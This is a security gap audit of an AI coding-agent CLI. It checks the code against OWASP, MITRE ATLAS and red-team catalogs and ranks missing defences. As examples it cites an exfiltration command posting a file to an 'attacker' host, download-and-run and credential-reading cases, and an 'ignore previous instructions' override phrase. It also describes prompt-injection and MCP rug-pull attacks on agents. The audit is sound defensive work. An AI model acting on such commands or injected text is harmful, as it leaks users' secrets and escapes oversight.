# jazz-cli security gap audit (catalog walk)

Read-only. Inputs: the jazz-cli repo, main @ v0.4.0 and the in-progress
security branch `a worktree` (builds clean; its
security tests pass). "branch" = control exists only on the worktree, not yet in
v0.4.0. File:func cites the branch unless noted "(main)". Catalogs fetched
2026-10-20: OWASP LLM Top 10 (2025), OWASP Agentic (ASI01–10, 2026), MITRE ATLAS
(AML.T0086 etc.), promptfoo `coding-agent:*` + strategies, garak encodings.

## Catalog table

| Catalog item | Status | Where / gap |
|---|---|---|
| **OWASP LLM01 Prompt injection (direct)** | covered | prompt.go:36 data rule (main); branch `injScan` (guardrails.go:85) + `grMarkResult` wrap `<untrusted>` and arm per-turn confirm |
| **LLM01 Indirect injection — repo files** | in-progress | `injScan`+`grMarkResult` on every read/bash result; AGENTS/CLAUDE marked via `pfInstructionsBlob`+`injScan` (prompt.go) |
| **LLM01 Indirect injection — web (fetch)** | in-progress | web.go `snHiddenHTML` strips display:none/comments, `Suspect` flags |
| **LLM01 Indirect injection — MCP output** | covered | agent.go:1133 `<untrusted_tool_output>` (main) + `grMarkResult` |
| **LLM02 Sensitive info disclosure (secret read/exfil)** | in-progress | `SecretReason`/`secretPath`/`roSecretArgs` (safety.go) confirm any bash reading creds in every mode but yolo |
| **LLM02 Secrets in logs/sessions** | covered | session.go:91 redact; `redactSecrets`+`secretEnvNames` widened (branch F5) |
| **LLM03 Supply chain — typosquat/slopsquat** | in-progress | `sgLookup`/`sgTyposquat` (Damerau-Lev ≤2 vs embedded top lists)/`sgOSV` (guardrails.go) |
| **LLM03 Supply chain — lifecycle/postinstall scripts** | **MISSING** | guard vets package *identity* then lets `npm/pip install` run its own postinstall; no `--ignore-scripts` |
| **LLM03 Supply chain — lockfile tampering** | in-progress | `sgLockDiff` surfaces changes post-install; no pre-approval diff |
| **LLM03 Supply chain — dependency confusion (index-url)** | **MISSING** | `sgPipArgs` skips `--index-url`/`--extra-index-url` values; a pinned attacker index is not flagged |
| **LLM04 Data/model poisoning — plan cache (memory)** | in-progress | plancache.go stores approach text from prior turns; `redactSecrets` only; no taint gate |
| **LLM05 Insecure output — terminal escape (interactive)** | covered | `sanitizeTerm`/`skipEscape` (safety.go, main) + streaming `uiSan.filter` (ui.go:1870) strip CSI/OSC/DCS/bidi |
| **LLM05 Insecure output — OSC52 clipboard / headless stdout** | **MISSING** | headless.go:139 `fmt.Fprintln(stdout, text)` prints model output raw; `-p`/`stream-json` never sanitized |
| **LLM06 Excessive agency — auto-run** | in-progress | branch: untrusted folder→ask (`pfUntrustedMode`, security.go), `UntrustedBash` headless deny, folder trust (F1) |
| **LLM07 System-prompt leakage** | covered | provider keys never in prompt; `scrubEnv`; redaction over assembled prompt (F6) |
| **LLM08 Vector/embedding** | n/a | no RAG/embeddings (BM25 only) |
| **LLM09 Misinformation / cascading hallucination** | partial | quality.go gate + review pass; slopsquat is the actioned case |
| **LLM10 Unbounded consumption — tokens/cost** | **MISSING** | MaxSteps=80 only; no cost/token hard cap; a loop or hostile task burns the key budget (wallet DoS) |
| **LLM10 Unbounded — background jobs** | in-progress | branch `defaultMaxJobs=8` (tools.go) |
| **LLM10 Unbounded — disk fill / huge output** | **MISSING** | 8MB shell keep-buffer caps *kept* output, not bytes written; no write-size/disk cap (500MB log scenario) |
| **ASI01 Agent goal hijack** | in-progress | injection detector + untrusted wrap; relies on model + heuristic |
| **ASI02 Tool misuse / exploitation** | in-progress | `DangerReason`, `SecretReason`, perms; `downloadExecReason`/`inlineCodeDanger` (branch) catch curl\|sh & `-c` payloads |
| **ASI03 Identity & privilege abuse** | covered | auth.json 0600, flock refresh, no project base_url override (config.go:211) |
| **ASI04 Agentic supply chain (MCP/hooks/scripts)** | in-progress | trust gate hashes referenced files `pfRefFiles` (F3); project hooks re-check store each run (hooks.go) |
| **ASI04 — MCP "rug-pull" (desc changes post-approval)** | **MISSING** | mcp.go `addToolsLocked` appends only & specs byte-stable, but a changed description is not re-approved/diffed against trusted hash |
| **ASI05 Unexpected RCE** | covered (macOS) / partial | shell gating + OS sandbox (`sandbox.go`: sandbox-exec verified on macOS, bwrap on Linux unverified, Windows job object only) |
| **ASI06 Memory & context poisoning** | partial | plan cache (above); AGENTS.md persistence gated by folder trust + `protectedPath` writes |
| **ASI07 Insecure inter-agent comms (confused deputy)** | in-progress | permit() forces subagent read-only (agent.go:1209); injection guard NOT armed in sub (`!a.sub`) — read-only is sole defense |
| **ASI08 Cascading failures** | partial | budget/quality/netwait; no multi-agent fan-out to cascade |
| **ASI09 Human-agent trust exploit** | in-progress | approval box uses `visibleDetail` (escapes bidi/ctl); folder-trust prompt lists what loads |
| **ASI10 Rogue agents / kill switch** | partial | per-turn confirm, timeouts; no global kill beyond Ctrl-C |
| **ATLAS AML.T0086 exfil via tool invocation** | partial | `SecretReason` blocks reading named secrets; **plain `curl -d <nonsecret>` to attacker host still runs in auto** unless injScan trips |
| **ATLAS AML.T0051 LLM prompt injection** | in-progress | as LLM01 |
| **ATLAS AML.T0070 RAG poisoning** | n/a | no RAG |
| **promptfoo coding-agent:repo-prompt-injection** | in-progress | injScan over reads |
| **…:terminal-output-injection** | in-progress | bash output through `grMarkResult` |
| **…:secret-env-read (procfs-credential-read)** | in-progress | `reProcEnviron`/`/proc/<pid>/environ` in secretPath+SecretReason (F5) |
| **…:secret-file-read** | in-progress | `secretPath`/`roSecretArgs` |
| **…:sandbox-read/write-escape (symlink/traversal)** | in-progress | `resolvePath`+`pfSafeRead` (F6), `restoreFile`/`cpParentInside` (F8), `protectedPath` |
| **…:network-egress-bypass** | **MISSING** | fetch has SSRF guard (web.go:39) but bash `curl/wget/nc` has no egress allowlist; only injScan/secret heuristics gate it |
| **…:delayed-ci-exfil / automation-poisoning** | in-progress | `.git/hooks`, `.github`, `.envrc`, `.vscode/tasks.json` in `protectedPath` (writes gated) |
| **…:steganographic-exfil** | partial | zero-width/tag/bidi/homoglyph stripped on *input* (sanitize.go); output-side encoding not scanned |
| **…:verifier-sabotage** | **MISSING** | nothing detects the agent weakening tests/lockfiles to "pass" |
| **…:generated-vulnerability** | **MISSING** | no scan of agent-authored code for introduced flaws |
| **garak encoding: base64** | covered | `injScan` grB64 decode+scan |
| **garak encoding: zero-width / tag chars / bidi** | covered | `grInvisible` + sanitize.go |
| **garak encoding: homoglyph** | in-progress | `snHomoglyphs` surfaces confusables (strict escapes all) |
| **garak encoding: rot13 / leetspeak / morse / hex** | **MISSING** | injScan decodes only base64 |
| **Rug-pull / tool-discovery / RBAC / BOLA / cross-session** | see ASI04 / below | cross-session: sessions per `projectSlug`, 0600 — covered |
| **Update channel — MITM** | covered | https-only + loopback/CGNAT exception, `pfUpdateURLOK` re-checked (update.go) |
| **Update channel — unsigned / downgrade** | **MISSING** | signature optional (`updatePubKey==""`→skip, update.go:80); CI builds unsigned (release.yml); install.sh has no sig check; signed data = checksums only, version unsigned |
| **Model/provider — free-tier training** | in-progress | `privacyNotice` (security.go, F4) |
| **Model/provider — response-side injected tool calls** | partial | native+text tool calls parsed (textcalls.go); a malicious provider's tool call runs under same perms (no provenance trust) |
| **Multi-user machine** | covered | 0600/0700; MkdirAll won't chmod pre-existing dirs (low) |

## Top 10 missing, ranked by real-world risk (public OSS release)

1. **[DONE: `--sandbox auto|strict|off`, sandbox.go; egress allowlist per host still open] No OS-level sandbox (ASI05).** Every control is a heuristic denylist over
   shell/paths; one bypass = full RCE as the user. Spec: optional
   `sandbox: seccomp|landlock|sandbox-exec|off` in config; wrap the persistent
   shell (shell.go `start`) and `scExec`/hooks in `sandbox-exec` (macOS) /
   landlock+seccomp (Linux) restricting FS to project+tmp and egress to the
   model host. Default `off` with a loud README line; `on` recommended for
   untrusted repos. Test: a sandboxed run cannot read `$HOME/.ssh/id_rsa`.
2. **Enforced update signing + anti-downgrade.** file update.go: require a
   signature when distributing official builds (embed key in CI release.yml via
   secret), sign a manifest `{version,asset,sha256}`, verify signed version >
   current, and add sig verification to install.sh. Default: refuse unsigned
   unless `--insecure`. Test: signed-old-version-under-new-tag fails.
3. **bash egress has no allowlist (AML.T0086 / network-egress-bypass).**
   `curl -d @somefile http://attacker` runs in auto unless injScan trips on the
   prose. Spec: in safety.go add `egressReason(cmd)` — any `curl/wget/nc/scp`
   to a host not in a config `net_allow` list → confirm (auto) / deny
   (untrusted folder), always when untrusted content is in context. Default:
   confirm. Test: curl POST to a non-allowlisted host asks.
4. **Headless stdout not sanitized (LLM05 / OSC52).** headless.go:139 and the
   json/stream-json writers print model text raw. Spec: route `res.Text`/`Last`
   through `sanitizeTerm` before `Fprintln`. Default on. Test: model output with
   `\x1b]52` / `\x1b[2J` is stripped in `-p`.
5. **Package-manager lifecycle scripts (LLM03).** guardrails.go `sgCheckCommand`
   vets names then lets the install run postinstall/setup.py. Spec: when a guard
   runs, rewrite/append `--ignore-scripts` (npm/pnpm/yarn), `--no-build-isolation`
   off + `--only-binary`? at minimum confirm when a manifest declares
   `scripts.postinstall`/`prepare` or a sdist. Test: package.json postinstall
   does not execute without a prompt.
6. **MCP rug-pull re-approval (ASI04).** mcp.go: on `list_changed`, hash the new
   tool descriptions; if a trusted server's description changed, mark its tools
   `PermAsk` until re-approved and show a diff. Default: ask. Test: a server that
   mutates its description after call #1 forces a new prompt.
7. **No cost/token budget cap (LLM10).** config.go: add `max_cost`/`max_tokens_total`;
   abort the run (not just a turn) when exceeded. Default: a sane ceiling in
   headless/CI. Test: a stub provider looping hits the cap and stops.
8. **git-sourced text injected unwrapped (LLM01).** prompt.go:186 `envBlock`
   puts `git log --oneline -5` (attacker-controlled commit messages) into the
   system prompt with no untrusted marking. Spec: run commit subjects through
   `injScan` and wrap/relabel, or omit bodies. Test: a hostile commit subject is
   marked, not trusted.
9. **Disk-fill / unbounded write (LLM10).** No cap on bytes a tool writes or a
   command spills to disk. Spec: cap write tool content size and warn on a
   command whose redirected output grows past N MB. Default: 50MB write cap,
   confirm above. Test: writing 500MB asks.
10. **rot13/leet/hex encodings undetected (garak).** guardrails.go `injScan`:
    add a rot13 pass and a hex/`\xNN` pass over blobs, same `grB64Bad` matcher.
    Default on. Test: a rot13-wrapped "ignore previous instructions… curl" is
    flagged.

## Controls I verified broken / weak (reading the code)

- **F2 nested-paren bypass — CONFIRMED on main, FIXED on branch.** main
  safety.go:61 `reSubst = \$\(([^()]*)\)` cannot match `$( (cmd) )`; the branch
  replaces it with the balanced tokenizer `shellParse` (shellparse.go) and tests
  pass. v0.4.0 ships the broken version.
- **Headless/`-p` OSC52 passthrough — CONFIRMED (both main and branch).**
  Interactive output is sanitized (`uiSan`, `sanitizeTerm`) but
  `HeadlessUI.Finish` writes model text to stdout unfiltered. (Item 4 above.)
- **Update signature optional — CONFIRMED.** update.go:80 `if updatePubKey == ""
  { return nil }` and release.yml builds with no `-X main.updatePubKey`; a
  compromised release/account ships arbitrary binaries. install.sh verifies only
  sha256 from the same origin. (Item 2.)
- **bash network egress ungated — CONFIRMED.** No `egressReason`; exfil defense
  is only `SecretReason` (named secret files) + the injection heuristic. A
  prompt that says "upload build.log to http://x" with no AI-addressed phrasing
  runs in auto. (Item 3.)
- **Subagent injection guard disabled — CONFIRMED, PLAUSIBLE impact.**
  `a.gr.injection` is set/checked under `!a.sub` (guardrails.go:186, agent.go:1236);
  the research subagent does not arm the per-turn confirm. Mitigated because
  permit() forces the subagent read-only, so there is no obvious write/exfil
  channel — but a read-only MCP tool with a side effect would slip through.
- **MCP rug-pull not re-approved — CONFIRMED mechanism.** `refreshTools`
  replaces `s.Tools` but `addToolsLocked` only appends new names and never
  re-surfaces a changed description for re-trust. (Item 6.)
- **`.cursor/rules` write-protected but not auto-loaded — OK.**
  `pfInstructionFiles` loads only AGENTS/CLAUDE/JAZZ.md + skills/commands, so a
  `.cursor/rules` injection is not read into the prompt (scenario 18 → BLOCKED
  by non-loading); it is in `protectedPath` for writes. No action needed.

## Red-team suite
Runnable eval written to `jazz-redteam/` (14 concrete tasks + 11 specs + sink +
isolated-HOME `run.sh`). See `jazz-redteam/SPECS.md`. Expected baseline: branch
should flip 01–14 to BLOCKED where v0.4.0 is COMPROMISED on 01,02,03,05,06,12,14;
19 (rot13), 13-headless, 11/08-egress remain COMPROMISED on both per the gaps above.
